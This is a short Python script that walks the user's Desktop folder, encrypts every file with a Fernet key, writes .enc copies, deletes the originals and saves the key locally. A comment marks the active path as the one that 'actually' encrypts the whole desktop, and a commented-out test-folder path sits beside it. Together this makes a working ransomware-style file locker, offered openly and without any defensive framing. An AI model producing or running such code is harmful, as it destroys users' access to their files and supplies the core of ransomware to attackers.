import os
from cryptography.fernet import Fernet

def generate_key():
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)
    return key

def encrypt_file(filepath, fernet):
    with open(filepath, "rb") as file:
        data = file.read()
    encrypted = fernet.encrypt(data)
    with open(filepath + ".enc", "wb") as enc_file:
        enc_file.write(encrypted)
    os.remove(filepath)  # Remove original file

def encrypt_desktop():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop") # Use this to actually encrypt all desktop
    # desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", "testfolder") # Use this for dev or testing purposes to test only on testfolder 
    key = generate_key()
    fernet = Fernet(key)
    print("[*] Encrypting files on your desktop...")

    for root, _, files in os.walk(desktop_path):
        for file in files:
            full_path = os.path.join(root, file)
            # Avoid encrypting the key file or already encrypted files
            if file.endswith(".enc") or file == "secret.key":
                continue
            try:
                encrypt_file(full_path, fernet)
                print(f"[+] Encrypted: {full_path}")
            except Exception as e:
                print(f"[!] Failed to encrypt {full_path}: {e}")

    print("[*] All files encrypted. Keep your key safe!")

if __name__ == "__main__":
    encrypt_desktop()
